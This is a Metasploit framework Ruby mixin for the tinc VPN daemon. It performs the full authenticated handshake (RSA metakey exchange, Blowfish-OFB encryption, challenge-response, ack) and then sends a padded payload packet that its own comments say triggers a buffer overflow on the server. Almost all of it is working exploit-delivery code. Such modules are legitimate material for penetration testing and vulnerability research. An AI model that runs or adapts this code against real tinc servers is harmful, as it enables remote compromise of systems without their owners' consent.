##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
#

require 'msf/core'
require 'msf/core/exploit/tcp'

require 'securerandom'
require 'openssl'
require 'digest/sha1'

module Msf

###
#
# This module does a handshake with a tincd server and sends one padded packet (payload)
# Author: Tobias Ospelt <tobias at modzero dot ch> @floyd_ch
###

module Exploit::Remote::TincdExploitClient
  include Msf::Exploit::Remote::Tcp

  #PROGRAM flow:
  #1. SYN, SYN/ACK, ACK - further TCP ACK's are not included
  #2. ID, client PSH: "0 testnode2 17.0"
  #3. ID, server PSH: "0 testnode2 17.0"
  #4. Metakey, client PSH: "1 94 64 0 0 VALUE_1"
  #5. Metakey, server PSH: "1 94 64 0 0 VALUE_2"
  #6. Receive Challenge from server, server PSH: 515 bytes - 3f8a4c...
  #7. Send Challenge to server, client PSH: 520 bytes - cdca80...
  #8. Challenge Reply to server, client PSH: 48 bytes - c2f415...
  #9. Challenge Reply from server, server PSH: 43 bytes - d34d78...
  #10. ACK of client, client PSH: 16 bytes - 7ffca1...
  #11. ACK part1 of server, server PSH: 11 bytes - 93fdcf...
  #12. ACK part2 of server, server PSH: 69 bytes - e6051a...
  #13. attack, client PSH: payload - 9d6a94...

  #def initialize(clientConfig, payload, stdout, stderr)
  def initialize(info={})
    super
    register_options(
      [ Opt::RPORT(655),
        #As this is a post-auth module, you should know the value of the following variables by simply checking
        #your configuration.
        OptPath.new('SERVER_PUBLIC_KEY_FILE',  [ true, 'Server\'s public key', '' ]),
        OptPath.new('CLIENT_PRIVATE_KEY_FILE', [ true, 'Client private key', '']),
        #You should see CLIENT_NAME in cleartext in the first message to the server by your usual tinc client (tcpdump or
        #wireshark it: e.g. "0 home 17.0", so it's "home"). On the server, this is located in the config folder, e.g. in FreeBSD
        #there is the client public key file /usr/local/etc/tinc/hosts/home for the client "home"
        #If you don't have a clue, maybe just try the filename of your private key without file extension
        OptString.new('CLIENT_NAME', [true, 'Your client name (pre-shared with server)' , '']),
      ], self
    )
  end

  def setupCiphers()
    @state = "id"
    @buffer = ""
    @inbuffer = ""
    @encryption_queue = []
    @decryption_queue = ""

    @payload = nil
    @keepReadingSocket = false

    #IMPORTANT: This class is untested with other lengths
    @bfblocksize =  64/8
    @key_len = 256
    print_status("Assuming challenge (key) length of %d" % @key_len)

    @client_private_key_cipher = nil
    @hex_enc_key_S1 = nil
    @bf_enc_cipher = nil
    self.initCiphers(datastore['SERVER_PUBLIC_KEY_FILE'], datastore['CLIENT_PRIVATE_KEY_FILE'])
    print_status("Ciphers locally initalized, private key and public key files seem to be ok")
    @bf_dec_cipher = nil
  end

  def sendPacketToTincServer(payload)
    @payload = payload
    @keepReadingSocket = true
    connect
    begin
      self.id() #send the first message
      while @keepReadingSocket
        data = sock.recv(1024)
        self.receive_data(data)
      end
      disconnect
    rescue Errno::ECONNRESET => e
      if @state == "metakey"
        print_error("Server reset the connection. Probably rejecting the private "\
        "key and/or client name (e.g. client name not associated with client public key on server side). "\
        "Wrong server public key possible too. "\
        "Please recheck client name, client private key and server public key.")
      else
        print_error("Server reset the connection, reason unknown.")
      end
    end
  end

  def initCiphers(server_file, client_file)
    server_public_key_cipher = OpenSSL::PKey::RSA.new(File.read(server_file))
    @client_private_key_cipher = OpenSSL::PKey::RSA.new(File.read(client_file))

    encryptionSuccessful = false
    while not encryptionSuccessful
      begin
        key_S1 = SecureRandom.random_bytes(@key_len)
        #can happen here:
        #`public_encrypt': data too large for modulus (OpenSSL::PKey::RSAError)
        enc_key_S1 = server_public_key_cipher.public_encrypt(key_S1, OpenSSL::PKey::RSA::NO_PADDING)
        encryptionSuccessful = true
      rescue OpenSSL::PKey::RSAError => e
        #the while loop will take care
      end
    end

    @hex_enc_key_S1 = enc_key_S1.unpack("H*")[0]

    # setup encryption
    bf_enc_key = key_S1[240...256]
    bf_enc_iv = key_S1[232...240]

    @bf_enc_cipher = OpenSSL::Cipher::Cipher.new("BF-OFB")
    @bf_enc_cipher.encrypt
    @bf_enc_cipher.key = bf_enc_key
    @bf_enc_cipher.iv = bf_enc_iv

    ##Looks like ruby openssl supports other lengths than multiple of 8!
    #test = @bf_enc_cipher.update("A"*10)
    #test << @bf_enc_cipher.final
    #puts "Testing cipher: "+test.unpack("H*")[0]
  end

  def receive_data(data)
    @inbuffer += data
    if @state == "id"
      if(self.has_line())
        data = self.get_line()
        print_status("Received ID from server: [%s]" % (data[0..30]))
        @state = "metakey" #next expected state
        self.metakey()
      end
    end
    if @state == "metakey"
      if self.has_line()
        data = get_line()
        print_status("Received Metakey from server: [%s...]" % (data[0..30]))
        data = data.split(" ")
        raise "Error in protocol. The first byte should be an ASCII 1." unless data[0] == "1"
        hexkey_S2 = data[5].rstrip #("\n")
        raise "Error in protocol. hexkey_S2 length should be %d." % @key_len*2 unless hexkey_S2.length == @key_len*2
        @enckey_S2 = [hexkey_S2].pack("H*")
        key_S2 = @client_private_key_cipher.private_decrypt(@enckey_S2, OpenSSL::PKey::RSA::NO_PADDING)

        # setup decryption
        bf_dec_key = key_S2[240..256]
        bf_dec_iv = key_S2[232..240]

        @bf_dec_cipher = OpenSSL::Cipher::Cipher.new "BF-OFB"
        @bf_dec_cipher.encrypt
        @bf_dec_cipher.key = bf_dec_key
        @bf_dec_cipher.iv = bf_dec_iv
        #OFB mode: don't forget, it does matter if you do a
        #@bf_dec_cipher.reset or not, but DON'T BECAUSE IT BREAKS STUFF :D
        print_status("Crypto handshake/exchange completed")
        @state = "challenge"
        self.challenge()
      end
    end

    if @state == "challenge"
      need_len = 515
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        print_status("Received challenge from server: [%s...]" % data.unpack("H*")[0][0..30])
        data = data.split(" ", 2)
        raise "Error in protocol. The first byte should be an ASCII 2." unless data[0] == "2"
        challenge2 = data[1][0...512]
        challenge2 = [challenge2].pack("H*")
        raise "Error in protocol. challenge2 length should be %d." % @key_len unless challenge2.length == @key_len
        @state = "challenge_reply"
        self.challenge_reply(challenge2)
      end
    end

    if @state == "challenge_reply"
      need_len = 43
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        print_status("Received challenge reply from server: [%s...]" % data.unpack("H*")[0][0..30])
        @state = "ack"
        self.ack()
      end
    end

    if @state == "ack"
      need_len = 12
      if @inbuffer.length >= need_len
        data = self.pop_inbuffer_and_decrypt(need_len)
        print_status("Received ack (server accepted challenge response): [%s...]" % data.unpack("H*")[0][0..30])
        @state = "done"
        self.overflow()
      end
    end
  end

  def handle_write()
    #handle encryption queue first
    if @encryption_queue.length > 0
      msg = @encryption_queue[0]
      @encryption_queue.delete_at(0)
      @buffer = @bf_enc_cipher.update(msg)
      @buffer << @bf_enc_cipher.final
      #DON'T DO A @bf_enc_cipher.reset
    end

    if @buffer.length > 0
      sent = self.send_data(@buffer)
      print_status("Sent %d bytes: [%s...]" % [sent, @buffer.unpack("H*")[0][0..30]])
      @buffer = @buffer[sent..@buffer.length]
    end
  end

  def send_data(buf)
    sock.put(buf)
    return buf.length
  end

  def pop_inbuffer_and_decrypt(size)
    @decryption_queue = pop_inbuffer(size)
    # In ruby openssl OFM works not only on full blocks, but also on
    # parts. Therefore no worries like in pycrypto and no
    # modified decrypt routine, simply use the cipher as is.
    data = @bf_dec_cipher.update(@decryption_queue)
    data << @bf_dec_cipher.final
    #DON'T DO A bf_dec_cipher.reset
    @decryption_queue = ""
    return data
  end

  def pop_inbuffer(size)
    data = @inbuffer[0...size]
    if size >= @inbuffer.length
      @inbuffer = ""
    else
      @inbuffer = @inbuffer[size+1..@inbuffer.length]
    end
    return data
  end

  def get_line()
    idx = @inbuffer.index("\n")
    data = self.pop_inbuffer(idx)
    return data
  end

  def has_line()
    if @inbuffer.match("\n")
      return true
    else
      return false
    end
  end

  def id()
    msg = "0 %s 17.0\n" % datastore['CLIENT_NAME']
    print_status("Sending ID (cleartext): [%s]" % msg.gsub("\n",""))
    @buffer += msg
    self.handle_write()
  end

  def metakey()
    msg = "1 94 64 0 0 %s\n" % (@hex_enc_key_S1)
    print_status("Sending metakey (cleartext): [%s...]" % msg[0..30])
    @buffer += msg
    self.handle_write()
  end

  def challenge()
    print_status("Sending challenge (ciphertext)")
    challenge = SecureRandom.random_bytes(@key_len)
    msg = "2      %s\n" % (challenge.unpack("H*")[0])
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def challenge_reply(challenge2)
    print_status("Sending challenge reply (ciphertext)")
    h = Digest::SHA1.hexdigest(challenge2)
    msg = "3      %s\n" % (h.upcase)
    @encryption_queue.push(msg)
    self.handle_write()
  end

  def ack()
    print_status("Sending ack (signalise server that we accept challenge reply, ciphertext)")
    @encryption_queue.push("4 %d 123 0    \n" % (datastore['RPORT']))
    self.handle_write()
  end

  def overflow()
    #This is actually where the buffer overflow happens in the exploit module
    print_status("Protocol finished setup. Going to send data.")
    msg = "17 %d\n%s" % [@payload.length, @payload]
    plen = @bfblocksize - (msg.length % @bfblocksize)
    #padding
    msg += "B" * plen
    @encryption_queue.push(msg)
    @keepReadingSocket = false
    self.handle_write()
  end
end

end
